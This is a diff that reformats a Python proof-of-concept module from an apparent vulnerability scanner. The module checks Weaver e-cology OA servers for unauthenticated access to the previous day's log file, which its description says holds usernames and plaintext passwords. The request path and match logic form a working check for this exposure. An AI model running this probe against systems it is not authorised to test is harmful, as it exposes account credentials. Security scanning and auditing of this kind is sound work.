@@ -7,11 +7,12 @@ import md5
 import time
 import datetime
 
+
 class Vuln(ABVuln):
-    vuln_id = 'weaver_0011' # 平台漏洞编号，留空
+    vuln_id = 'weaver_0011'  # 平台漏洞编号，留空
     name = '泛微e-cology未授权访问日志'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_OPERATION # 漏洞类型
+    type = VulnType.FILE_OPERATION  # 漏洞类型
     disclosure_date = '2013-12-23'  # 漏洞公布时间
     desc = '''
         1号店OA使用泛微E-COLOGY可未授权访问日志（包含用户名，密码，而且是明码）,造成管理用户帐号外泄。
@@ -22,6 +23,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '泛微OA'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '8908a568-23df-4303-8325-30d929573d06'
@@ -35,14 +37,14 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #__Refer___ = http://www.wooyun.org/bugs/wooyun-2010-046804
+
+            # __Refer___ = http://www.wooyun.org/bugs/wooyun-2010-046804
             hh = hackhttp.hackhttp()
             yesterday = str(datetime.date.today() - datetime.timedelta(days=1))
-            payload = "/log/ecology_" + yesterday.replace('-','') + ".log"
+            payload = "/log/ecology_" + yesterday.replace('-', '') + ".log"
             target = self.target + payload
             code, head, res, errcode, _ = hh.http(target)
-            
+
             if code == 200 and yesterday in res and 'ERROR' in res and 'weaver.system.WfUrgerTimer' in res:
                 #security_warning(target+': log is leaked')
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
@@ -53,6 +55,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
